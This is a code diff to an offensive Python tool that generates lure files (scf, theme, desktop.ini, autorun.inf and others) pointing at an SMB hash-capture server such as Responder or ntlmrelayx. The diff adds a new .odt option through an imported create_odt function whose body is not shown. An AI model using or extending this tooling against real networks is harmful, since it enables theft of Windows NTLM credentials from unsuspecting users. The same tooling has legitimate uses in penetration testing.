@@ -29,6 +29,7 @@ import io
 import os
 import shutil
 import xlsxwriter
+from custom.odt_gen import create_odt
 from sys import exit
 
 #the basic path of the script, make it possible to run from anywhere
@@ -68,7 +69,8 @@ def build_parser():
             "zoom",
             "libraryms",
             "autoruninf",
-            "desktopini")),
+            "desktopini",
+            "odt")),
         help='Choose to generate all files or a specific filetype')
     parser.add_argument('-s', '--server',action='store', dest='server',required=True,
         help='The IP address of your SMB hash capture server (Responder, impacket ntlmrelayx, Metasploit auxiliary/server/capture/smb, etc)')
@@ -609,6 +611,8 @@ def main():
 
         create_theme(args.generate, args.server, os.path.join(args.filename, base_filename + ".theme"))
 
+        create_odt(args.server, os.path.join(args.filename, base_filename + ".odt"))
+
     elif(args.generate == "scf"):
         create_scf(args.generate, args.server, os.path.join(args.filename, base_filename + ".scf"))
 
@@ -669,6 +673,9 @@ def main():
 
     elif(args.generate == "theme"):
         create_theme(args.generate, args.server, os.path.join(args.filename, base_filename + ".theme"))
+
+    elif(args.generate == "odt"):
+        create_odt(args.server, os.path.join(args.filename, base_filename + ".odt"))
 
     print("Generation Complete.")
 
